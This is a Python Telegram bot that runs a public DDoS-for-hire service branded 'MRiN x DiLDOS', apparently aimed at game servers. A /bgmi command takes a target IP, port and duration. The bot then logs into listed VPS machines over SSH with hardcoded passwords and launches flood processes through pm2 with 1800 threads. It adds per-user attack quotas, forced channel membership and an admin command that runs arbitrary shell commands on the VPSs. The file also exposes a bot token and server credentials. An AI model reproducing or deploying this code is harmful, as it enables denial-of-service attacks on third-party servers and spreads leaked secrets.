import os
import telebot
import asyncio
import paramiko
import random
import time
import logging
from threading import Thread
from datetime import datetime, timedelta, timezone
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram import Bot, Dispatcher, Router, types
from aiogram.types import Message
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command
from aiogram.client.default import DefaultBotProperties


logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

TOKEN = '8035475015:AAHQL5W5pmOhynAOqP5u9U3iQbSseD0PbH8' 
CHANNEL_ID = '-1002444623350'
required_channel = '@MRiNxDiLDOS'  # Replace with your actual channel username

bot = telebot.TeleBot(TOKEN)

user_attacks = {}
user_cooldowns = {}
last_feedback_photo = {}  # Initialize this dictionary
user_photos = {}
user_bans = {}  # Tracks user ban status and ban expiry time

COOLDOWN_DURATION = 300  # Cooldown duration in seconds
BAN_DURATION = timedelta(minutes=15)
DAILY_ATTACK_LIMIT = 10  # Daily attack limit per user
DEFAULT_THREADS = 1800


blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001, 10000, 10001, 10002, 32000, 32001, 32003]  # Blocked ports list

ADMIN_LIST = [2007860433]  # Add all admin user IDs here
EXEMPTED_USERS = [6768273586, 1431950109, 6111808288, 1340584902, 5317827318, 7082215587, 2007860433, 7017469802]

# Semaphore to limit concurrent attacks to two
attack_semaphore = asyncio.Semaphore(2)

def admin_only(func):
    def wrapper(message, *args, **kwargs):
        if message.from_user.id not in ADMIN_LIST:
            bot.send_message(message.chat.id, "❌ Unauthorized access.")
            return
        return func(message, *args, **kwargs)
    return wrapper

# Function to run each attack in a separate thread with semaphore control
def run_attack_thread(chat_id, ip, port, duration):
    asyncio.run(run_attack(chat_id, ip, port, duration))

# Initialize reset_time at midnight IST of the current day
def initialize_reset_time():
    """Initialize reset_time to midnight IST of the current day."""
    ist_now = datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=5, minutes=30)))
    return ist_now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)

# Global variable to track the next reset time
reset_time = initialize_reset_time()

def reset_daily_counts():
    """Reset the daily attack counts and other data at midnight IST."""
    global reset_time
    ist_now = datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=5, minutes=30)))
    # Check if it's time to reset
    if ist_now >= reset_time:
        # Clear all daily data
        user_attacks.clear()
        user_cooldowns.clear()
        user_photos.clear()
        user_bans.clear()
        # Set the next reset time to midnight IST of the next day
        reset_time = ist_now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)
        logging.info(f"Next reset scheduled at: {reset_time}")

# Function to validate IP address
def is_valid_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)

# Function to validate port number
def is_valid_port(port):
    return port.isdigit() and 0 <= int(port) <= 65535

# Function to validate duration
def is_valid_duration(duration):
    return duration.isdigit() and int(duration) > 0

# Function to run each attack in a separate thread

VPS_LIST = [
    ("stom_0", "144.202.50.24", "Stom@0000"),
    ("stom_0", "155.138.192.246", "Stom@0000"),
]

@bot.message_handler(commands=['mrin'])
@admin_only
def mrin_command(message):
    bot.send_message(
        message.chat.id,
        """⚙️ Admin > Commands >

`/addvps ip|user|pass`   🖥️

`/removevps ip`   🗑️

`/terminal ip command`   💻

`/threads num`   🧵

`/vpslist`   🌐

`/status`   📶""",
        parse_mode="Markdown",
    )


@bot.message_handler(commands=['addvps'])
@admin_only
def add_vps(message):
    try:
        ip, user, pw = message.text.split()[1].split("|")
        VPS_LIST.append((user, ip, pw))
        bot.send_message(message.chat.id, f"✅ VPS {ip} added.")
    except:
        bot.send_message(message.chat.id, "Usage: /addvps ip|user|pass")

@bot.message_handler(commands=['removevps'])
@admin_only
def remove_vps(message):
    try:
        ip = message.text.split()[1]
        global VPS_LIST
        VPS_LIST = [v for v in VPS_LIST if v[1] != ip]
        bot.send_message(message.chat.id, f"🗑️ VPS {ip} removed.")
    except:
        bot.send_message(message.chat.id, "Usage: /removevps ip")

@bot.message_handler(commands=['vpslist'])
@admin_only
def list_vps(message):
    out = "\n".join([f"{ip} ({user})" for user, ip, _ in VPS_LIST])
    bot.send_message(message.chat.id, f"🌐 VPS List :\n\n`{out}`", parse_mode="Markdown")

@bot.message_handler(commands=['threads'])
@admin_only
def set_threads(message):
    global DEFAULT_THREADS
    try:
        DEFAULT_THREADS = int(message.text.split()[1])
        bot.send_message(message.chat.id, f"🧵 Threads set to {DEFAULT_THREADS}.")
    except:
        bot.send_message(message.chat.id, "Usage: /threads 100")

@bot.message_handler(commands=['status'])
@admin_only
def status_command(message):
    statuses = []
    for user, ip, pw in VPS_LIST:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=user, password=pw, timeout=5)
            ssh.close() 
            statuses.append(f"✅ VPS  `{ip}1 : 8080` is up")
        except Exception as e:
            statuses.append(f"❌ VPS  `{ip}1 : 8080` is down")
    bot.send_message(message.chat.id, "\n".join(statuses), parse_mode="Markdown")


@bot.message_handler(commands=['terminal'])
@admin_only
def terminal_command(message):
    try:
        _, ip, command = message.text.split(maxsplit=2)
        vps = next((v for v in VPS_LIST if v[1] == ip), None)
        if not vps:
            return bot.send_message(message.chat.id, f"❌ VPS with IP {ip} not found.")
        user, _, pw = vps
        import paramiko
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=ip, username=user, password=pw, look_for_keys=False, allow_agent=False)
        stdin, stdout, stderr = ssh.exec_command(command)
        output = stdout.read().decode() + stderr.read().decode()
        ssh.close()
        bot.send_message(message.chat.id, f"💻 Output from {ip}:\n\n{output.strip() or '⚠️ No output received.'}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ SSH error on {ip}: {str(e)}")

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "NO NAME"
    user_username = f"@{message.from_user.username}" if message.from_user.username else "No Username"

    # Fetch user profile picture
    try:
        photos = bot.get_user_profile_photos(user_id)
        has_photo = photos.total_count > 0
    except Exception:
        has_photo = False

    # Stylish welcome message
    welcome_text = (
        f"     👋🏻 *𝗛𝗶𝗶𝗶,  {user_name} ! \n 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗠𝗥𝗶𝗡 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™ 𝗣𝗨𝗕𝗟𝗶𝗖 𝗕𝗢𝗧*\n\n"
        f"🆔  *𝗬𝗢𝗨𝗥 𝗨𝗦𝗘𝗥 - 𝗜𝗗 > * `{user_id}`\n"
        f"👤  *𝗬𝗢𝗨𝗥 𝗨𝗦𝗘𝗥 - 𝗡𝗔𝗠𝗘 > * `{user_name}`\n\n"
        "📢 *𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝘁𝗼 𝗽𝗿𝗼𝗰𝗲𝗲𝗱 𝗳𝘂𝗿𝘁𝗵𝗲𝗿 👀*\n\n"
        "              [➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖](https://t.me/MRiNxDiLDOS)\n\n"
        "📌 *𝗧𝗿𝘆  𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱:* `/bgmi` \n\n"
    )

    # Buttons
    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("[➖ 𝗠𝗔𝗜𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 ➖]", url="https://t.me/MRiNxDiLDOS")
    )
    keyboard.add(
        InlineKeyboardButton("[➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗨𝗦𝗘 𝗠𝗘 ➖]", url="https://t.me/MRiNxDiLDOSCHaT123")
    )

    # Send message with or without profile photo
    if has_photo:
        try:
            photo_file_id = photos.photos[0][0].file_id
            bot.send_photo(
                message.chat.id, photo_file_id,
                caption=welcome_text,
                parse_mode="Markdown",
                reply_markup=keyboard
            )
        except Exception:
            bot.send_message(
                message.chat.id, welcome_text,
                parse_mode="Markdown",
                disable_web_page_preview=True,
                reply_markup=keyboard
            )
    else:
        bot.send_message(
            message.chat.id, welcome_text,
            parse_mode="Markdown",
            disable_web_page_preview=True,
            reply_markup=keyboard
        )

    # Send rebranding message AFTER welcome message
    bot.send_message(
        message.chat.id,
        f"➤    [➖𝗗𝗠 𝗙𝗢𝗥 𝗥𝗘𝗕𝗥𝗔𝗡𝗗𝗜𝗡𝗚 ➖](https://t.me/M_o_Y_zZz)   ᯓᡣ𐭩\n\n",
        parse_mode="Markdown",
        disable_web_page_preview=True  # This disables the link preview
    )


@bot.message_handler(commands=['bgmi'])
def bgmi_command(message):
    global user_attacks, user_cooldowns, user_photos, user_bans

    user_id = message.from_user.id
    user_name = message.from_user.first_name or "Unknown"

    # Ensure default values for user data
    if user_id not in user_attacks:
        user_attacks[user_id] = 0
    if user_id not in user_cooldowns:
        user_cooldowns[user_id] = None
    if user_id not in user_photos:
        user_photos[user_id] = False
    if user_id not in user_bans:
        user_bans[user_id] = None

    # Fetch user profile picture
    try:
        photos = bot.get_user_profile_photos(user_id)
        has_photo = photos.total_count > 0
    except Exception:
        has_photo = False

    # Check if the user is a member of the required channel
    try:
        user_status = bot.get_chat_member(required_channel, user_id).status
        if user_status not in ["member", "administrator", "creator"]:
            message_text = (
                f"🚨𝗛𝗜 👋 {message.from_user.first_name}, \n\n‼️ *𝗠𝗥𝗶𝗡 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™ 𝗣𝗨𝗕𝗟𝗜𝗖 𝗕𝗢𝗧 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗 !* ‼️\n\n"
                f"[➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖](https://t.me/MRiNxDiLDOS)\n\n"
                "🔒 *𝗬𝗼𝘂 𝗺𝘂𝘀𝘁 𝗷𝗼𝗶𝗻 𝗮𝗻𝗱 𝗯𝗲𝗰𝗼𝗺𝗲 𝗮 𝗺𝗲𝗺𝗯𝗲𝗿 𝗼𝗳 𝗼𝘂𝗿 𝗼𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗵𝗲𝗿𝗲!* 🔒\n\n"
                "‼️ *𝗔𝗳𝘁𝗲𝗿 𝗷𝗼𝗶𝗻𝗶𝗻𝗴, 𝘁𝗿𝘆 𝘁𝗵𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 `/attack` 𝗮𝗴𝗮𝗶𝗻* ‼️"
            )
            if has_photo:
                try:
                    photo_file_id = photos.photos[0][0].file_id
                    bot.send_photo(
                        message.chat.id, photo_file_id,
                        caption=message_text,
                        parse_mode="Markdown"
                    )
                except Exception:
                    bot.send_message(
                        message.chat.id, "Unable to fetch profile photo.",
                        parse_mode="Markdown"
                    )
            else:
                bot.send_message(message.chat.id, message_text, parse_mode="Markdown", disable_web_page_preview=True)
            return

    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")
        return

    # Ensure the bot only works in the specified channel or group
    if str(message.chat.id) != CHANNEL_ID:
        bot.send_message(
            message.chat.id,
            "‼️ 𝗧𝗵𝗶𝘀 𝗯𝗼𝘁 𝗶𝘀 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗵𝗲𝗿𝗲 ‼️\n\n"
            "       [➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗨𝗦𝗘 𝗠𝗘 ➖](https://t.me/MRiNxDiLDOSCHaT123 )\n\n"
            "👀 𝗕𝗢𝗧 𝗠𝗔𝗗𝗘 𝗕𝗬 : @MrinMoYxCB [ TUMHARE_PAPA ]",
            parse_mode="Markdown",
            disable_web_page_preview=True
        )
        return

    # Reset counts daily
    reset_daily_counts()

    # Check if two attacks are currently running
    if attack_semaphore._value == 0:
        bot.send_message(
            message.chat.id,
            f"‼️  *𝟮 / 𝟮 𝗮𝘁𝘁𝗮𝗰𝗸𝘀 𝗮𝗿𝗲 𝗰𝘂𝗿𝗿𝗲𝗻𝘁𝗹𝘆 𝗽𝗿𝗼𝗰𝗲𝗲𝗱𝗶𝗻𝗴.... 𝗞𝗶𝗻𝗱𝗹𝘆 𝘄𝗮𝗶𝘁 𝗳𝗼𝗿 𝗮𝗻𝘆 𝗼𝗻𝗲 𝘁𝗼 𝗳𝗶𝗻𝗶𝘀𝗵* ‼️",
            parse_mode="Markdown"
        )
        return

    # Calculate remaining attacks for the user
    remaining_attacks = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)

    # Check if the user is banned
    if user_bans[user_id]:
        ban_expiry = user_bans[user_id]
        if datetime.now() < ban_expiry:
            remaining_ban_time = (ban_expiry - datetime.now()).total_seconds()
            minutes, seconds = divmod(remaining_ban_time, 60)
            bot.send_message(
                message.chat.id,
                f"⚠️⚠️ 𝙃𝙞 {message.from_user.first_name}, 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙤𝙧 𝙣𝙤𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙞𝙣𝙜 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝙖𝙛𝙩𝙚𝙧 𝙮𝙤𝙪𝙧 𝙡𝙖𝙨𝙩 𝙖𝙩𝙩𝙖𝙘𝙠. 𝙆𝙞𝙣𝙙𝙡𝙮 𝙎𝙚𝙣𝙙 𝙖 𝙥𝙝𝙤𝙩𝙤 𝙖𝙣𝙙 𝙬𝙖𝙞𝙩 {int(minutes)} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {int(seconds)} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 !  ⚠️⚠️"
            )
            return
        else:
            user_bans[user_id] = None  # Remove ban after expiry

    # Check cooldowns for non-exempt users
    if user_id not in EXEMPTED_USERS:
        if user_cooldowns[user_id]:
            cooldown_time = user_cooldowns[user_id]
            if datetime.now() < cooldown_time:
                remaining_time = (cooldown_time - datetime.now()).seconds
                minutes, seconds = divmod(remaining_time, 60)
                bot.send_message(
                    message.chat.id,
                    f"⚠️⚠️ 𝙃𝙞 {message.from_user.first_name}, 𝙮𝙤𝙪 𝙖𝙧𝙚 𝙘𝙪𝙧𝙧𝙚𝙣𝙩𝙡𝙮 𝙤𝙣 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {remaining_time // 60} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {remaining_time % 60} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 ⚠️⚠️"
                )
                return

    # Check attack limits for non-exempt users
    if remaining_attacks <= 0:
        bot.send_message(
            message.chat.id,
            f"𝙃𝙞 {message.from_user.first_name}, 𝙮𝙤𝙪 𝙝𝙖𝙫𝙚 𝙧𝙚𝙖𝙘𝙝𝙚𝙙 𝙩𝙝𝙚 𝙢𝙖𝙭𝙞𝙢𝙪𝙢 𝙣𝙪𝙢𝙗𝙚𝙧 𝙤𝙛 𝙖𝙩𝙩𝙖𝙘𝙠-𝙡𝙞𝙢𝙞𝙩 𝙛𝙤𝙧 𝙩𝙤𝙙𝙖𝙮, 𝘾𝙤𝙢𝙚𝘽𝙖𝙘𝙠 𝙏𝙤𝙢𝙤𝙧𝙧𝙤𝙬 ✌️"
        )
        return

    # Check feedback requirement for non-exempt users
    if user_attacks.get(user_id, 0) > 0 and not user_photos.get(user_id):
        if not user_bans[user_id]:
            user_bans[user_id] = datetime.now() + BAN_DURATION
        bot.send_message(
            message.chat.id,
            f"𝙃𝙞 {message.from_user.first_name}, ⚠️⚠️𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝙖𝙛𝙩𝙚𝙧 𝙮𝙤𝙪𝙧 𝙡𝙖𝙨𝙩 𝙖𝙩𝙩𝙖𝙘𝙠. 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙧𝙤𝙢 𝙪𝙨𝙞𝙣𝙜 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙛𝙤𝙧 𝟭𝟱 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 ⚠️⚠️"
        )
        return

    try:
        args = message.text.split()[1:]
        if len(args) != 3:
            raise ValueError("𝗠𝗥𝗶𝗡 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™ 𝗣𝗨𝗕𝗟𝗶𝗖 𝗕𝗢𝗧 𝗔𝗖𝗧𝗶𝗩𝗘 ✅ \n\n ⚙ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙛𝙤𝙧𝙢𝙖𝙩\n /bgmi <target_ip> <target_port> <duration>")
        
        ip, port, duration = args

        # Validate inputs
        if not is_valid_ip(ip):
            raise ValueError("Invalid IP address.")
        if not is_valid_port(port):
            raise ValueError("Invalid port number.")
        if not is_valid_duration(duration):
            raise ValueError("Invalid duration.")

        port = int(port)
        if port in blocked_ports:
            bot.send_message(message.chat.id,
                              f"‼️ 𝙋𝙤𝙧𝙩 {port} 𝙞𝙨 𝙗𝙡𝙤𝙘𝙠𝙚𝙙 ‼️ , 𝙋𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙖 𝙙𝙞𝙛𝙛𝙚𝙧𝙚𝙣𝙩 𝙥𝙤𝙧𝙩 ✅")
            return

        # Override duration to fixed value (120 seconds)
        default_duration = 180
        user_duration = int(duration)

        # Increment attack count for non-exempt users
        if user_id not in EXEMPTED_USERS:
            user_attacks[user_id] += 1
        
        remaining_attacks = DAILY_ATTACK_LIMIT - user_attacks.get(user_id)

        # Set cooldown for non-exempt users
        if user_id not in EXEMPTED_USERS:
            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)

        # Calculate VPS count
        vps_count = len(VPS_LIST)

        # Notify the attack has started
        bot.send_message(
            message.chat.id,
            f"🚀 𝙃𝙞𝙞 {message.from_user.first_name}, 𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙚𝙣𝙩 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙛𝙤𝙧 {default_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.\n\n"
            f"•  𝗥𝗲𝗾𝘂𝗲𝘀𝘁𝗲𝗱 𝗧𝗮𝗿𝗴𝗲𝘁 : `{ip}`\n"
            f"•  𝗥𝗲𝗾𝘂𝗲𝘀𝘁𝗲𝗱 𝗣𝗼𝗿𝘁 : `{port}`\n"
            f"•  𝗥𝗲𝗾𝘂𝗲𝘀𝘁𝗲𝗱 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 : `{user_duration}` 𝙨𝙚𝙘𝙤𝙣𝙙𝙨\n"
            f"•  𝗧𝗢𝗧𝗔𝗟 𝗩𝗣𝗦 𝗨𝗦𝗘𝗗 : {vps_count}\n\n"
            f"𝙔𝙤𝙪 𝙖𝙧𝙚 𝙡𝙚𝙛𝙩 𝙬𝙞𝙩𝙝 {remaining_attacks} 𝙖𝙩𝙩𝙖𝙘𝙠𝙨 𝙤𝙪𝙩 𝙤𝙛 𝟭𝟬\n\n"
            f"‼️ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙎𝙚𝙣𝙙 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝘼𝙛𝙩𝙚𝙧𝙬𝙖𝙧𝙙𝙨 ‼️",
            parse_mode="Markdown"
        )

        bot.send_message(
            message.chat.id,
            f"𝗔𝗧𝗧𝗔𝗖𝗞 𝗪𝗜𝗟𝗟 𝗦𝗧𝗔𝗥𝗧 𝗪𝗜𝗧𝗛 𝗔 𝗗𝗘𝗟𝗔𝗬 𝗢𝗙 𝟱 𝗦𝗘𝗖𝗢𝗡𝗗𝗦.... ",
            parse_mode="Markdown"
        )

        # Run the attack on all VPS and send a single finish message
        Thread(target=run_attack_on_all_vps, args=(message, ip, port, default_duration)).start()

    except Exception as e:
        bot.send_message(message.chat.id, f"{str(e)}")

def run_attack_on_all_vps(message, target_ip, port, duration):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    vps_ips = []
    tasks = []
    for user, vps_ip, vps_pw in VPS_LIST:
        vps_ips.append(vps_ip)
        tasks.append(run_attack_on_vps(vps_ip, user, vps_pw, target_ip, port, duration))
    loop.run_until_complete(asyncio.gather(*tasks))
    
    # After all attacks are done, send the single finish message
    vps_lines = "\n".join([f"•  𝗙𝗿𝗼𝗺 𝗩𝗣𝗦 : `{ip}`" for ip in vps_ips])
    
    bot.send_message(
        message.chat.id,
        f"🚀 𝘼𝙩𝙩𝙖𝙘𝙠 𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅\n\n"
        f"•  𝗥𝗲𝗾𝘂𝗲𝘀𝘁𝗲𝗱 𝗧𝗮𝗿𝗴𝗲𝘁 : `{target_ip}` \n"
        f"•  𝗥𝗲𝗾𝘂𝗲𝘀𝘁𝗲𝗱 𝗣𝗼𝗿𝘁 : `{port}`\n"
        f"•  𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 : `{duration}` 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 \n"
        f"{vps_lines}\n\n"
        f"𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 <> 𝗧𝗲𝗮𝗺 𝗠𝗥𝗶𝗡 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™",
        parse_mode="Markdown"
    )

async def run_attack_on_vps(ip, username, password, target_ip, port, duration):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=username, password=password)
        shell = ssh.invoke_shell()
        shell.send("cd freeroot && bash root.sh\n")
        await asyncio.sleep(3)
        shell.send("pkill -f runner.py\npm2 delete all || true\n")
        await asyncio.sleep(1)
        pname = f"attack_{ip.replace('.', '_')}"
        shell.send(
            f"pm2 start runner.py --name {pname} --interpreter python3 --no-autorestart -- {target_ip} {port} {duration} {DEFAULT_THREADS}\n"
        )
        await asyncio.sleep(duration)
        shell.send(f"pm2 stop {pname}\npm2 delete {pname}\n")
        ssh.close()
    except Exception as e:
        print(f"❌ Error on {ip}: {e}")


# Handling photo feedback
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    """Handles photo feedback from users."""
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    photo_id = message.photo[-1].file_id  # Get the latest photo ID

    # Check if the user has sent the same feedback before & give a warning
    if last_feedback_photo.get(user_id) == photo_id:
        response = (
            f"‼ {message.from_user.first_name}  𝗕𝗔𝗕𝗨𝗨𝗨𝗨....  𝗗𝗢𝗡'𝗧 𝗦𝗘𝗡𝗗 𝗗𝗨𝗣𝗟𝗜𝗖𝗔𝗧𝗘 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞 ‼\n\n⚠️ 𝗘𝗟𝗦𝗘 𝗜'𝗟𝗟 𝗕𝗔𝗡 𝗬𝗢𝗨 𝗙𝗢𝗥 𝗔 𝗗𝗔𝗬 👀"
        )
        bot.reply_to(message, response)
        return  # Prevents further processing if it's a duplicate

    # Store the new feedback ID (this ensures future warnings)
    last_feedback_photo[user_id] = photo_id
    user_photos[user_id] = True  # Mark feedback as given

    # Stylish confirmation message for the user
    response = (
        f"𝗧𝗵𝗮𝗻𝗸 𝘆𝗼𝘂 𝗳𝗼𝗿 𝘆𝗼𝘂𝗿 𝗳𝗲𝗲𝗱𝗯𝗮𝗰𝗸 ✅ , {message.from_user.first_name}!  𝗬𝗼𝘂 𝗰𝗮𝗻 𝗻𝗼𝘄 𝗰𝗼𝗻𝘁𝗶𝗻𝘂𝗲 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗲 𝗯𝗼𝘁."
    )
    bot.reply_to(message, response)

# Start the bot
if __name__ == "__main__":
    logging.info("Bot is starting...")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"An error occurred: {e}")
